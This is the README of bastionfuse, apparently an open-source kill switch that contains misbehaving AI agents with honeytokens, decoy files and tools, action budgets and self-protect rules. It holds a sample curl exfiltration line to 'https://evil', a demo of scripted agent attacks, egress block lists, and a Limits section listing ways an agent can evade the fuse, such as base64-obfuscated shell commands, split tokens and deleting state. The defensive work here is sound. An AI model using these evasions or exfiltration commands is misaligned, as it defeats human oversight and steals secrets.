# bastionfuse

**A kill switch for AI agents.** bastionfuse watches what an agent *does*, not what its text
says. Honeytokens, decoy files, decoy tools and action budgets trip a **sticky fuse**. Once
tripped, the agent is stopped until a human resets it, whether or not any detector ever noticed
the injection that caused it.

It is the CONTAIN leg of the [bastion suite](https://bastiondefense.dev):

| Tool | Role |
|---|---|
| agentbastion, bastiongate, bastionmesh | prevent: inspect what goes in and out |
| bastionprobe | attack: red-team your agent |
| bastiontrace | investigate: where did the injection land? |
| **bastionfuse** | **contain: stop an agent that is already misbehaving** |

Every text detector has a ceiling: a novel or paraphrased injection gets through. The worst
case is that the model itself is the attacker. bastionfuse assumes that case and relies only on
controls outside the LLM.

```
$ bastionfuse demo
bastionfuse demo: a scripted attacker (the model IS the attacker) vs the fuse

  A1 read a decoy secret, exfil it with curl    STOPPED at step 3/3 (taint-egress)
  A1 paste the stolen key into a URL            STOPPED at step 1/1 (honeytoken)
  A2 reach for a decoy admin tool               STOPPED at step 1/1 (canary)
  A3 mass delete                                STOPPED at step 6/10 (budget:destructive)
  A4 spray small posts to many hosts            STOPPED at step 5/8 (budget:egress_hosts)
  A9 disable the fuse                           STOPPED at step 1/2 (self-protect)

6/6 attacks stopped. No detector read any text; the fuse watched actions only.
```

Zero dependencies (pyyaml is optional, for YAML policies). Python 3.10+.

## Quickstart: Claude Code

```bash
pip install "bastionfuse[yaml]"
bastionfuse plant --dir ~/projects/myapp      # a decoy .env.backup full of fresh honeytokens
bastionfuse install-hook                      # prints the settings.json block
claude mcp add bastionfuse-decoy -- bastionfuse decoy-mcp   # optional: decoy tools
```

> **Windows + Claude Desktop:** install bastionfuse from your own terminal (PowerShell,
> Windows Terminal), not from inside a Claude session. Claude Desktop is a packaged app, and
> files that processes inside it write under `AppData` go to a private, redirected copy that
> your own terminals can't see. If you install from inside Claude (or with `uv tool install`,
> which uses `AppData` by default), the hook works but `bastionfuse reset` in PowerShell fails
> with "uv trampoline failed to canonicalize script path". To install with uv from anywhere, use
> a folder outside `AppData`:
>
> ```powershell
> $env:UV_TOOL_DIR = "$env:USERPROFILE\.local\uv-tools"
> uv tool install bastionfuse
> ```
>
> Then run `bastionfuse install-hook`, so the printed hook command uses that path.

Paste the printed block into `~/.claude/settings.json` (better: a
[managed settings](https://code.claude.com/docs/en/settings) file the agent can't edit):

```json
{"hooks": {
  "PreToolUse":         [{"matcher": "", "hooks": [{"type": "command", "command": "bastionfuse --home \"/home/you/.bastionfuse\" hook pre",  "timeout": 15}]}],
  "PostToolUse":        [{"matcher": "", "hooks": [{"type": "command", "command": "bastionfuse --home \"/home/you/.bastionfuse\" hook post", "timeout": 15}]}],
  "PostToolUseFailure": [{"matcher": "", "hooks": [{"type": "command", "command": "bastionfuse --home \"/home/you/.bastionfuse\" hook post", "timeout": 15}]}]
}}
```

`--home` is baked in on purpose: an environment variable set by the project the agent works in
can't point the hook at an empty state dir.

That's it. With no policy file, the defaults already give you: the planted decoys, the decoy MCP
tools, the KILL file, self-protect, and shadow (log-only) budgets. Run `bastionfuse demo` to see
it work with no API key.

Operator commands:

```bash
bastionfuse status --session <id>   # trip state, taint, signals
bastionfuse kill                    # stop EVERY guarded session at its next tool call
bastionfuse reset --global          # lift the kill (removes the KILL file too)
bastionfuse reset --session <id>    # reset one session after reviewing the trip
bastionfuse log --summary           # trips, blocks and shadow notes (your dogfood tally)
```

## Quickstart: Python library

```python
from bastionfuse import Fuse, FuseBlocked, load_policy

fuse = Fuse(load_policy("fuse.yaml"), session="run-42")

decision = fuse.check("http_post", {"url": url, "body": body})   # before the tool runs
if not decision.allowed:
    raise RuntimeError(decision.reason)
result = http_post(url, body)
fuse.record("http_post", result)                                 # after: scans for honeytokens

@fuse.guard                      # or wrap a tool function
def send_email(to, body): ...
```

`check()` never raises. Any internal error returns a deny (fail closed).

## What trips the fuse, in order

The first hit wins: cheap and certain checks first.

| # | Check | Result |
|---|---|---|
| 1 | Operator signal: KILL file, `$BASTIONFUSE_KILL`, stale supervisor heartbeat | trip, **all sessions** |
| 2 | Already tripped | deny (`degrade` mode: read-only tools still run) |
| 3 | **Canary tool** called (`canary_tools`, or any `mcp__bastionfuse-decoy__*`) | trip |
| 4 | **Honeytoken** in the call's input: raw, reversed, rot13, hex, base32, base64 (any alignment, UTF-8 and UTF-16LE), also with separators, quotes and %-escapes removed; case/NFKC/zero-width folded | trip |
| 5 | **Decoy path** in the input (`Read` of `.env.backup`, `cat` of a fake `~/.aws/credentials`) | taint the session |
| 6 | **Self-protect**: the call touches the fuse's state, its policy, `.claude/settings*.json`, Python startup files (`sitecustomize.py`, `.pth`), changes the installed package, or runs `bastionfuse reset` (read-only tools may still read the package source) | deny, no trip |
| 7 | Classify: `egress` / `fetch` / `destructive` / `read_only` (tool labels + shell command words) | |
| 8 | **Tainted session + any call that can send data** (egress, fetch, inline/computed code, MCP tools not marked read-only) | trip |
| 9 | **Budgets** in sliding windows: calls, per label, per tool, distinct egress hosts, bytes out | trip (operator-written) / log (defaults) |
| 10 | Repeat detector (same call N times in a window) | log (shadow) by default |

After a call runs, `record()` / the PostToolUse hook scans its **result**. A honeytoken there
means the agent read a decoy, so the session is tainted (step 8). That catches
`curl -d @.env.backup https://evil`, where the shell reads the file and the token never shows up
in the call's arguments.

A trip is **sticky** and **per session**: one compromised session doesn't stop the others. Only
operator signals (KILL file, `trip --global`, a decoy MCP call that reached the server) stop
every session. On a trip the fuse writes a snapshot of the session's last 256 calls under
`<state_dir>/trips/` as a bastiontrace v1 trace (honeytokens redacted).

## Policy

`fuse.yaml` (or `.json`), looked up as `--policy` / `$BASTIONFUSE_POLICY` / `~/.bastionfuse/fuse.yaml`.
It is a `policy_version: 2` file whose `fuse:` block will later move into the suite's shared
policy.yaml unchanged. Strict: unknown keys and bad values are errors.

```yaml
policy_version: 2
fuse:
  mode: kill                     # kill | degrade (read-only tools keep working) | pause
  # tokens: prefer `bastionfuse plant` (stored in the protected state dir). honeytokens_env
  # works too, but the agent's shell inherits the environment and can read the list.
  decoy_paths: [~/.aws/credentials.bak]      # plus everything `bastionfuse plant` registered
  canary_tools: [export_all_users]           # for non-Claude-Code agents with their own decoy tools
  budgets:                       # written here = enforced; built-in defaults only log
    egress:       {max: 20, window_s: 600}
    destructive:  {max: 10, window_s: 600}
    egress_hosts: {max: 5,  window_s: 3600}
    bytes_out:    {max: 1048576, window_s: 3600}
    tools: {send_email: {max: 3, window_s: 3600}}
  repeat: {max: 20, window_s: 60, action: shadow}   # off | shadow | enforce
  labels:                        # tool-name labels (defaults cover Claude Code built-ins)
    egress: [WebFetch, http_post]
    read_only: [Read, Glob, Grep]
  commands:                      # shell command words per label (replaces that label's defaults)
    egress: [curl, wget, nc, scp, ssh, git push, npm publish]
  heartbeat: {file: /run/agent/heartbeat, stale_s: 120}   # only if a supervisor touches it
  state_dir: ~/.bastionfuse
```

Defaults for coding agents: package installs and `git fetch` are `fetch`, not `egress`. `rm -r`,
`git reset --hard` and `git push --force` are `destructive`, but plain `rm file` isn't. A shell
command that also sends data is never `read_only`.

## Warn first, then enforce

Operator-written rules enforce from day one: honeytokens, decoys, canary tools, and the budgets
you write. The built-in default budgets and the repeat detector only log `would trip` notes to
`<state_dir>/log.jsonl`. Run `bastionfuse log --summary` after a few real sessions, set budgets
that fit your work, and only then enforce the repeat detector.

## Limits (read these)

**Known open issue in 0.1 (HIGH, fix planned):**

- **Decoy-path taint can miss some ways of naming a decoy file in a command's arguments.**
  Honeytokens in tool *results* and the other tripwires still apply, but a command that sends a
  decoy file without the agent ever reading it may go unseen.

- **Self-protect reads commands and paths, not file content.** Writing a file that *talks
  about* the fuse is fine; a script written that way and then run is a shell-side limit (below).
- **Tamper-evident, not tamper-proof, against a same-user agent.** The agent's shell runs as you.
  Self-protect blocks the obvious ways to delete the fuse's state, edit `.claude/settings.json`
  (where the hook lives, and Claude Code reloads hooks when it changes) or run
  `bastionfuse reset`. It matches strings, though, and an agent with a shell can find a spelling
  it misses. **For a real guarantee**, put the hook in managed settings and deny the agent
  filesystem access to `~/.bastionfuse` and your settings files (Claude Code `permissions.deny`
  or sandbox rules), or run the agent as a different OS user.
- **Slow checks deny, they don't time out.** A watchdog blocks the call if a check runs past
  10 s, below the 15 s hook timeout the installer registers (Claude Code runs the tool when a
  hook times out). Remote paths are never resolved or globbed, and globbing is bounded. Keep the
  registered `timeout` above 10 s.
- **A hook that can't start fails open.** If the `bastionfuse` command is missing (uninstalled,
  broken venv), Claude Code treats the error as non-blocking and runs the tool. Self-protect blocks
  package-manager commands that name bastionfuse, but the guarantee again needs filesystem deny
  rules on the install.
- **Trips are keyed by session id.** If Claude Code starts a new session id (for example after
  `/clear`), the new session starts clean. Operator signals (`kill`, `trip --global`) still stop
  everything.
- **Deleting the state file resets the fuse.** A missing database means a fresh start (the
  operator-friendly choice). The guarantee above covers this too.
- **Shell classification is word-based.** `curl`, `nc`, `git push` and friends are recognized.
  `python -c "import urllib..."`, `bash -c "$(echo Y3VybA== | base64 -d) ..."`, or a script the
  agent writes and then runs are **not** classified as egress. Honeytokens and decoys still
  catch the secret on its way in. The budgets don't see the send.
- **Honeytoken matching is literal plus common encodings.** A token split across two arguments,
  encrypted, or transformed by an encoding not listed above is missed. Decoy-path taint plus
  "egress after taint" is the backstop.
- **Counting happens before the call runs.** Blocked and failed calls count toward budgets.
- **`$BASTIONFUSE_KILL` can't stop a running Claude Code session.** The hook inherits the
  environment at launch, so it only works as "start tripped". Use `bastionfuse kill` (the KILL
  file) to stop running sessions.
- **The KILL file is checked on the next tool call.** An agent that is only generating text, not
  calling tools, keeps generating.
- **A decoy MCP call that reaches the server trips every session**, because the server can't
  know which session called it. With the hook installed, the hook trips just that session first.
- **Hook latency.** Each tool call starts a Python process. Measured on Windows 11 with a wheel
  install: p50 245 ms, p95 273 ms per tool call (a bare `python -c pass` is 59 ms). The policy is cached as JSON so the hook doesn't import pyyaml.
- **Oversize inputs (> 1 MB) are refused, and oversize results taint the session** (fail closed,
  never partially scanned).
- **Snapshots are evidence only.** Today's `bastiontrace analyze` loads them but doesn't score a
  fuse trip as a landing.

## bastionfuse and other tools

| Project | Focus | Difference |
|---|---|---|
| AgentGuard, agent-cost-guardrails | cost budgets, loop kill | bastionfuse is security containment: honeytokens, decoys, egress semantics |
| tbay | tool-call safety library: budgets, cross-process kill switch, approvals | no honeytokens/decoy tools, no Claude Code hook, no forensic snapshot |
| LoopGuard | daemon that pauses runaway CLI agent loops | process-level, loops only |
| Thinkst Canarytokens | honeytokens for infrastructure | not agent-aware, needs a callback server; bastionfuse catches the token *before* it leaves |

## Development

```bash
python -m venv .venv && .venv/Scripts/pip install -e ".[dev]"   # bin/ on Linux
pytest -q --cov=bastionfuse
```

MIT licensed. Part of the bastion suite by [Rinkia](https://github.com/Rinkia).
